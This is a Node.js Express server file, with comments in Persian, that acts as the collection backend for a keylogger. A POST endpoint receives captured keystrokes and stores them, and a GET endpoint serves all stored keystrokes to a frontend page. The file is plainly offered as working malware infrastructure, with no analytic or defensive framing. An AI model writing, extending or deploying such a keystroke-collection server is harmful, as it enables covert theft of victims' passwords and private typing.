const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(__dirname)); // دسترسی به index.html

// ذخیره داده‌ها
let keysData = [];

// دریافت داده از Keylogger
app.post("/api/send_keys", (req, res) => {
    const { keys } = req.body;
    if (keys) {
        keysData.push(keys);
    }
    res.json({ status: "ok" });
});

// ارسال داده‌ها به Frontend
app.get("/api/send_keys", (req, res) => {
    res.json(keysData);
});

// شروع سرور
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
